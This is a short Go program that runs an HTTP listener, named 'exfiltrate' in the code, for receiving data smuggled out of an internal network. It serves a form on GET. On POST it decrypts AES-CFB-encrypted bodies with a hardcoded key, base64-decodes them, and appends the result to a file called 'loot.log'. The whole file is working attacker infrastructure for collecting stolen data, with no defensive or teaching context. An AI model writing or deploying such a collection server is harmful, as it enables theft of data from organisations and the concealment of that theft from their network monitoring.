package main

//
// post clear text http information from internal client
// to external server
//
import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

func decrypt(key, text []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(text) < aes.BlockSize {
		return nil, errors.New("ciphertext too short")
	}
	iv := text[:aes.BlockSize]
	text = text[aes.BlockSize:]
	cfb := cipher.NewCFBDecrypter(block, iv)
	cfb.XORKeyStream(text, text)
	data, err := base64.StdEncoding.DecodeString(string(text))
	if err != nil {
		return nil, err
	}
	return data, nil
}

func postfile(s string) {

	f, err := os.OpenFile("loot.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Fatal(err)
	}
	nb, err := f.Write([]byte(s + "\n"))
	if err != nil {
		log.Fatal(err)
	}

	if err := f.Close(); err != nil {
		log.Fatal(err)
	}
	fmt.Printf("loot:%s bytes:%d\n", s, nb)
}

func exfiltrate(w http.ResponseWriter, r *http.Request) {
	key := []byte("a very very very very secret key") // 32 bytes
	if r.URL.Path != "/" {
		http.Error(w, "404 not found.", http.StatusNotFound)
		return
	}

	switch r.Method {
	case "GET":
		http.ServeFile(w, r, "form.html")
	case "POST":
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			log.Fatal(err)
		}
		result, err := decrypt(key, body)
		postfile(string(result))

		//
		// send back an ack
		//
		output, err := json.Marshal("ack")
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		w.Header().Set("content-type", "application/json")
		w.Write(output)

	default:
		fmt.Fprintf(w, "Sorry, only GET and POST methods are supported.")
	}
}

func main() {

	// expecting port
	portPtr := flag.String("port", "12970", "-port=\"8080\"")
	flag.Parse()
	//
	// lets define our handlers
	//
	http.HandleFunc("/", exfiltrate)
	s := ":" + *portPtr
	fmt.Printf("Starting server on port %s...\n", s)
	if err := http.ListenAndServe(s, nil); err != nil {
		log.Fatal(err)
	}
}
